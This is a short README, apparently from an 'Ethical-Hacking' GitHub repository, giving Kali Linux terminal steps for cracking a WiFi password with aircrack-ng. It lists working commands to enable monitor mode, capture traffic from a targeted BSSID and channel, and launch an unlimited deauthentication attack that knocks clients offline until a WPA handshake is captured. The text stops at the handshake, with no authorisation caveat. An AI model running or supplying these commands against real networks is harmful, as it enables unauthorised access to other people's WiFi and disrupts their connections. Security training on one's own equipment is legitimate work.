
# Password Cracking using aircrack-ng

These are the steps to be followed to Crack WIFI Key Using Kali Linux

Terminal Commands:

    sudo su
     airmon-ng check kill
     airmon-ng start wlan0
     airodump-ng wlan0mon



<img src="https://github.com/Surjith1001/Ethical-Hacking/assets/125909533/4b917857-302b-4641-9302-cde9918ce22b">
<img src="https://github.com/Surjith1001/Ethical-Hacking/assets/125909533/171bdeda-8442-4751-9830-a13bcf55f7c4">

In new terminal:

    sudo su
     cd Desktop
     airodump-ng wlan0mon --bssid (target Bssid) -c (Target Channel Number) -w (hand_shake file name)


After running the above command there will be certain .csv and .cap files created based on the (hand_shake file name) name specified.

<img src="https://github.com/Surjith1001/Ethical-Hacking/assets/125909533/016a13a7-d958-40a9-967a-68d11028a294">
<img src="https://github.com/Surjith1001/Ethical-Hacking/assets/125909533/50cf51ff-d8b3-480c-8be4-8198d7029a59">

For Deauthentication attack open new terminal:

    aireplay-ng --deauth 0 -a (Target Bssid) wlan0mon 

Run the Deauthentication attack till you get a WPA Handshake
